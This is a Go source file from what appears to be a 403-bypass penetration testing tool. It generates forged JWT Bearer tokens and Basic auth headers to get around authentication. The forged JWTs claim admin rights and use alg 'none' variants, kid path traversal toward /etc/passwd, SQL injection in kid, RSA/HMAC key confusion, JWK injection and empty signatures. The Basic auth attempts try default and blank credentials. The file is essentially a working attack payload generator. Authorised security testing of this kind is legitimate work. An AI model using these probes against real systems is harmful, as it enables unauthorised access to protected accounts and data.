package bypass403

import (
	"encoding/base64"
)

// buildJWTBearerAttempts generates JWT manipulation probes for Bearer-protected endpoints.
func buildJWTBearerAttempts(rawURL, method string) []Attempt {
	if method == "" {
		method = "GET"
	}
	payloadAdmin := `{"sub":"admin","role":"admin","admin":true}`
	var out []Attempt
	add := func(label, token string) {
		out = append(out, Attempt{
			Category: JWTBearerAbuse,
			Label:    label,
			Method:   method,
			URL:      rawURL,
			Headers:  map[string]string{"Authorization": "Bearer " + token},
		})
	}

	for _, alg := range []string{"none", "None", "NONE", "nOnE"} {
		hdr := `{"alg":"` + alg + `","typ":"JWT"}`
		add("jwt_alg_"+alg, unsignedJWT(hdr, payloadAdmin))
	}

	add("jwt_kid_path_traversal", signedJWTStub(
		`{"alg":"RS256","typ":"JWT","kid":"../../dev/null"}`,
		payloadAdmin,
	))
	add("jwt_kid_sqli", signedJWTStub(
		`{"alg":"RS256","typ":"JWT","kid":"' OR '1'='1"}`,
		payloadAdmin,
	))
	add("jwt_kid_null_byte", signedJWTStub(
		`{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd%00"}`,
		payloadAdmin,
	))
	add("jwt_key_confusion_rsa_hmac", signedJWTStub(
		`{"alg":"HS256","typ":"JWT","jwk":{"kty":"RSA","n":"akca","e":"AQAB"}}`,
		payloadAdmin,
	))
	add("jwt_jwk_injection", signedJWTStub(
		`{"alg":"HS256","typ":"JWT","jwk":{"kty":"oct","k":"YWRtaW4="}}`,
		payloadAdmin,
	))
	add("jwt_empty_signature", unsignedJWT(`{"alg":"HS256","typ":"JWT"}`, payloadAdmin))
	add("jwt_expired_admin", signedJWTStub(
		`{"alg":"HS256","typ":"JWT"}`,
		`{"sub":"admin","role":"admin","exp":9999999999}`,
	))

	return out
}

func buildBasicAuthAttempts(rawURL, method string) []Attempt {
	if method == "" {
		method = "GET"
	}
	creds := []struct {
		label string
		value string
	}{
		{"basic_empty", ""},
		{"basic_admin_admin", basicToken("admin", "admin")},
		{"basic_admin_blank", basicToken("admin", "")},
		{"basic_null_null", basicToken("\x00", "\x00")},
		{"basic_colon", basicToken(":", ":")},
	}
	var out []Attempt
	for _, c := range creds {
		hdr := map[string]string{}
		if c.value != "" {
			hdr["Authorization"] = "Basic " + c.value
		} else {
			hdr["Authorization"] = "Basic "
		}
		out = append(out, Attempt{
			Category: BasicAuthAbuse,
			Label:    c.label,
			Method:   method,
			URL:      rawURL,
			Headers:  hdr,
		})
	}
	return out
}

func basicToken(user, pass string) string {
	return base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
}

func unsignedJWT(headerJSON, payloadJSON string) string {
	hb := base64.RawURLEncoding.EncodeToString([]byte(headerJSON))
	pb := base64.RawURLEncoding.EncodeToString([]byte(payloadJSON))
	return hb + "." + pb + "."
}

func signedJWTStub(headerJSON, payloadJSON string) string {
	hb := base64.RawURLEncoding.EncodeToString([]byte(headerJSON))
	pb := base64.RawURLEncoding.EncodeToString([]byte(payloadJSON))
	sig := base64.RawURLEncoding.EncodeToString([]byte("akca-probe"))
	return hb + "." + pb + "." + sig
}
